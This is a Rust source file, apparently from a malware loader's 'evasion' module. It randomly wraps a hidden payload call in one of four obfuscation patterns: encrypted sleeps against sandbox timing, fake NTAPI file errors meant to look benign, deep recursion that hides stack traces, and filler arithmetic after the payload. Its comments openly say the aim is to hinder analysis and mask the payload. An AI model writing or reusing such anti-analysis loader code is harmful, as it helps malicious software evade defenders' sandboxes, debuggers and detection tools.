// loader/src/evasion/flow.rs

use rand::Rng;

use crate::{evasion::anti_debug::encrypted_sleep, execute_real_logic, native::{call::NativeAPI, file_ops::nt_file_exists}};

    
/// Execute a given function using a polymorphic control flow strategy.
/// 
/// This method randomly chooses from a set of evasion patterns designed
/// to alter the execution path and hinder static or dynamic analysis.
/// Each path applies different types of noise or control flow variation.
/// 
/// The supplied `func` is not executed directly—instead, it's wrapped in one
/// of several flow obfuscation patterns to increase complexity.
pub fn polymorphic_execute<F>(func: F) 
    where
        F: FnOnce() + Send + 'static,
    {
        let method = rand::thread_rng().gen_range(0..4);
        
        match method {
            0 => execute_with_delays(func),
            1 => execute_with_fake_errors(func),
            2 => execute_with_recursion(func),
            3 => execute_with_jumps(func),
            _ => func(),
        }
    }


/// Flow variant #1: Adds random delays before and after execution.
/// 
/// This technique simulates natural processing time, making sandbox timing
/// analysis harder. It also introduces some meaningless arithmetic between sleeps.
fn execute_with_delays<F>(func: F)
    where
        F: FnOnce() + Send + 'static,
    {
        let mut rng = rand::thread_rng();
        
        // Introduce random short delays with filler computation
        for _ in 0..rng.gen_range(1..4) {
            encrypted_sleep(rng.gen_range(1..50));
            
            // Dummy calculation to increase instruction count
            let mut x = 0u64;
            for i in 0..100 {
                x = x.wrapping_add(i);
            }
        }
        let _ = execute_real_logic();
        let _ = func;
        

        encrypted_sleep(rng.gen_range(10..100));
    }



/// Flow variant #2: Simulates benign system errors using NTAPI.
/// 
/// This variant introduces fake system failures like missing files,
/// which can mimic behavior of legitimate applications encountering I/O issues.
/// These "errors" are meant to blend in with expected noise in real software.   
fn execute_with_fake_errors<F>(func: F)
where
    F: FnOnce() + Send + 'static,
{
    unsafe {
        if let Ok(native_api) = NativeAPI::new() {
            // Simulate invalid file access (expected to fail)
            let _ = nt_file_exists(&native_api, "C:\\This\\Does\\Not\\Exist.fake");
            
            // Execute core logic mid-way through "error-handling"
            let _ = execute_real_logic();
            let _ = func;
            
            // Another fake I/O call
            let _ = nt_file_exists(&native_api, "C:\\Fake\\Path\\To\\Nothing.xyz");
        } else {
            // If NTAPI resolution fails, fallback to just running the closure
            let _ = func;
        }
    }
}



/// Flow variant #3: Wraps execution in recursive layers to obfuscate stack traces.
/// 
/// Deep call stacks with non-linear depth make it harder for debuggers and analyzers
/// to identify the real execution point. Includes useless arithmetic to burn cycles.   
fn execute_with_recursion<F>(func: F)
    where
        F: FnOnce() + Send + 'static,
    {
        fn recursive_wrapper<F2>(depth: usize, func: F2) 
        where
            F2: FnOnce() + 'static,
        {
            if depth == 0 {
                let _ = execute_real_logic();
                let _ = func;
            } else {
                // Arbitrary calculation to pad the stack frame
                let mut x = depth as u64;
                for i in 0..10 {
                    x = x.wrapping_mul(i + 1);
                }
                
                // Recurse with reduced depth
                recursive_wrapper(depth - 1, func);
            }
        }
        
        let depth = rand::thread_rng().gen_range(5..15);
        recursive_wrapper(depth, func);
    }



/// Flow variant #4: Executes the logic up front, followed by meaningless operations.
/// 
/// This breaks expectations that side effects always happen last, which can confuse
/// naive instrumentation. Includes loop-based filler and delays to mask the payload.   
fn execute_with_jumps<F>(func: F)
where
    F: FnOnce() + Send + 'static,
{
    // Real logic is triggered first
    let _ = execute_real_logic();
    
    // Followed by noisy computation and timing
    let mut rng = rand::thread_rng();
    
    for _ in 0..rng.gen_range(3..8) {
        let mut x = 0u64;
        for j in 0..100 {
            x = x.wrapping_add(j as u64);
            x = x.rotate_left((j % 8) as u32);
        }
        encrypted_sleep(rng.gen_range(1..10));
    }
}